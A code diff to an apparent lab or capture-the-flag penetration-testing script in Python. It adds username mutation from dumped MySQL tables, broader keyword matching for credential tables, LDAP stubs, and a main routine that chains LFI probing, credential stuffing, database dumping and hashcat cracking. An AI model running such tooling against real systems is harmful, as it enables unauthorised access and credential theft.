@@ -15,6 +15,7 @@ import mysql.connector
 import subprocess
 import asyncio
 import signal
+import ldap3
 
 
 ip_1 = "10.10.147.69"
@@ -32,6 +33,10 @@ found_web_directories = []
 links = []
 lfi_results = []
 lfi_candidates = []
+domain_names = {
+    "ip": "",
+    "domain name": ""
+}
 
 class Scanner:
     def __init__(self, ip):
@@ -51,6 +56,10 @@ class Scanner:
             services.append({'ip': ip, 'port': port, 'service': service})
         print(df)
         print(services)
+    
+    def extract_domain_name(self):
+        # we want to look for DNS or LDAP service within the scanned services
+        pass
 
 class WebFuzzing:
     """
@@ -343,7 +352,7 @@ class Services:
                 cursor.execute("SHOW DATABASES")
                 databases = cursor.fetchall()
                 cursor.close()
-                keywords = ['user', 'password', 'hash', 'users']
+                keywords = ['user', 'password', 'hash', 'users', 'first_name', 'last_name']
                 interesting_table = []
                 preconfiqured_dbs = ['mysql', 'performance_schema', 'information_schema', 'sys']
                 exclude_preconfigured_dbs = True
@@ -401,15 +410,21 @@ class Services:
                         #print summary and each row for review
                         print(all_table_data)
                         mysql_data = pd.DataFrame(rows, columns=col_names)
-                        hash_functions = Hashes(mysql_data)
-                        hash_functions.extract_hash_from_data()
+                        extracted_hashes = Credential_material(mysql_data)
+                        extracted_hashes.extract_hash_from_data()
+                        Credential_material.extract_usernames_and_mutate(mysql_data)
                         print(mysql_data)
                         print(hashes)
                     
         except mysql.connector.Error as e:
             print(f"The following error has occured: {e}")
 
-class Hashes:
+    def ldap_connection(self, credentials: dict):
+
+        pass
+
+
+class Credential_material:
     def __init__(self, data: dict):
         self.data = data
         
@@ -454,6 +469,42 @@ class Hashes:
                     print(f"Cracked password added: {cracked}")  
         except Exception as e:
             print(f"The following error has occured: {e}")
+
+    @staticmethod
+    def extract_usernames_and_mutate(df: pd.DataFrame):
+        key_username_strings = ['name', 'handle', 'first', 'last']
+        temp_user_dict = {}
+        for col in df.columns:
+            for key in key_username_strings:
+                #match any column that ends with the keyword (wildcard before string)
+                if re.fullmatch(f'.*{key}', col) or col.lower().startswith(key):
+                    temp_user_dict[col] = df[col].tolist() # Save all values from the column
+        print("Extracted usernames columns and values", temp_user_dict)
+
+        #Mutation logic: Combine first initial + last name
+        first_names = []
+        last_names = []
+        # find all the first and last names column, the logic here is if a column begins with "first" we treat it as a first_name and vice versa
+        for col in temp_user_dict:
+            if col.lower().startswith('first'):
+                first_names = temp_user_dict[col]
+            elif col.lower().startswith('last'):
+                last_names = temp_user_dict[col]
+        #if both found, combine
+        if first_names and last_names:
+            for fn, ln in zip(first_names, last_names):
+                if fn and ln:
+                    users.append(f"{fn[0].lower()}{ln.lower()}")
+        # if only one column is found, add all its values
+        else:
+            for values in temp_user_dict.values():
+                for val in values:
+                    users.append(str(val).lower())
+        print(f"extracted possible usernames: {users}")
+                    
+                
+
+
         
 
 
@@ -465,10 +516,10 @@ class Hashes:
 
 
 if __name__ == "__main__":
-    scanner = Scanner(ip=ip_2)
-    scanner.scan_all_ports()
-    web_actions = WebFuzzing(ip_2, 1)
-    asyncio.run(web_actions.start())
+    #scanner = Scanner(ip=ip_2)
+    #scanner.scan_all_ports()
+    #web_actions = WebFuzzing(ip_2, 1)
+    #asyncio.run(web_actions.start())
     #web_actions.httpx_fuzzing()
     test_lfi = WebFuzzing(ip_2, 1)
     test_lfi.locate_lfi('/dev')
@@ -477,9 +528,10 @@ if __name__ == "__main__":
     test_credential = Services(ip_2)
     test_credential.credential_stuffing()
     test_credential.mysql_interaction()
-    hash_functions = Hashes(hashes)
+    hash_functions = Credential_material(hashes)
     hash_functions.extract_hash_from_data()
     hash_functions.hashcat_md5(hashes)
+    print(password)
 
 
 
